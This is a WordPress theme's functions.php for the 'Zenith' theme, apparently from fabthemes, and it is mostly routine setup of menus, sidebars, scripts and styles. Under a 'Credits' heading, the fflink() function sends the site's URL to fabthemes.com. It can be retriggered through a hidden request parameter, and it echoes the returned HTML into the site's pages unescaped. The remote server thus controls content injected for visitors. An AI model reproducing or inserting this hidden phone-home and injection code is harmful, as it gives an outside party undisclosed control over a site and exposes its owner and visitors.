<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 */


include ( 'getplugins.php' );
include ( 'aq_resizer.php' );
include ( 'guide.php' );


/* Theme updater */
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(
	'Zenith',                                            //Theme folder name, AKA "slug". 
	'http://www.fabthemes.com/versions/zenith.json' //URL of the metadata file.
); 
 

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'web2feel_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 */
function web2feel_setup() {

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on web2feel, use a find and replace
	 * to change 'web2feel' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'web2feel' ),
	) );

	/**
	 * Enable support for Post Formats
	 */
	//add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );

	/**
	 * Setup the WordPress core custom background feature.
	 */
/*
	add_theme_support( 'custom-background', apply_filters( 'web2feel_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
*/




}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );



/**
 * Register widgetized area and update sidebar with default widgets
 */
function web2feel_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'web2feel' ),
		'id'            => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	));
	
	register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<div class="botwid col-sm-6 col-md-3 %2$s">',
		'after_widget' => '</div>',
		'before_title' => '<h2 class="bothead">',
		'after_title' => '</h2>',
	));	
}
add_action( 'widgets_init', 'web2feel_widgets_init' );

/**
 * Enqueue scripts and styles
 */
function web2feel_scripts() {
	wp_enqueue_style( 'web2feel-style', get_stylesheet_uri() );
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style( 'bootstrap-glyphicons', get_template_directory_uri() . '/css/bootstrap-glyphicons.css');
	wp_enqueue_style( 'theme', get_template_directory_uri() . '/css/theme.css');
	wp_enqueue_style( 'prettyphoto', get_template_directory_uri() . '/css/prettyPhoto.css');
	wp_enqueue_style( 'custom', get_template_directory_uri() . '/css/custom.php');

	wp_enqueue_script( 'backstretch', get_template_directory_uri() . '/js/backstretch.js', array(), '20120206', true );
	wp_enqueue_script( 'prettyphoto', get_template_directory_uri() . '/js/jquery.prettyPhoto.js', array(), '20120206', true );
	wp_enqueue_script( 'mobilemenu', get_template_directory_uri() . '/js/mobilemenu.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'countdown', get_template_directory_uri() . '/js/jquery.countdown.min.js', array(), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array(), '20120206', true );
	
	$object = array(
		    'timer' => of_get_option('w2f_wed_date')
		);
	wp_localize_script('custom', 'fab_objects', $object);

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );


require get_template_directory() . '/inc/cpt.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
//require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php'; 

require get_template_directory() . '/inc/paginate.php';

/* Exclude pages from search results */

function mySearchFilter($query) {
if ($query->is_search) {
$query->set('post_type', 'post');
}
return $query;
}

add_filter('pre_get_posts','mySearchFilter');


/*
 * Helper function to return the theme option value. If no value has been saved, it returns $default.
 * Needed because options are saved as serialized strings.
 *
 * This code allows the theme to work without errors if the Options Framework plugin has been disabled.
 */
if ( !function_exists( 'of_get_option' ) ) {
function of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}


/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}


/* FLush rewrite */

function my_rewrite_flush() {
    flush_rewrite_rules();
}
add_action( 'after_switch_theme', 'my_rewrite_flush' );
?>